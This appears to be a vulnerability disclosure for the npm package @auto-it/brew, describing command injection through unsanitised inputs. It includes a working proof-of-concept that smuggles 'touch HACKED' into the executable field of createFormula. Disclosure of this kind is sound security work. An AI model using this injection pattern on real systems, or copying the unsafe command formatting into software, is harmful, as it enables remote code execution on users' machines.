# :bug: Description

The `@auto-it/brew` module is vulnerable against `RCE` since the `inputs` are `formatted` inside a command executed without checks, leading to `arbitrary command injection`

# :fire: POC

1. Create the following PoC file:

```js
// poc.js
var brew = require('@auto-it/brew');
var Brew = new brew.default();
Brew.createFormula({git:{getLatestTagInBranch:function(){}}, logger:{log:{error:function(){}, info:function(){}}}}, {"executable":"ssss; touch HACKED; #", "name":"test"})

```
2. Check there aren't files called `HACKED` 
3. Execute the following commands in another terminal:

```bash
npm i @auto-it/brew # Install affected module
node poc.js #  Run the PoC
```
4. Recheck the files: now `HACKED` has been created
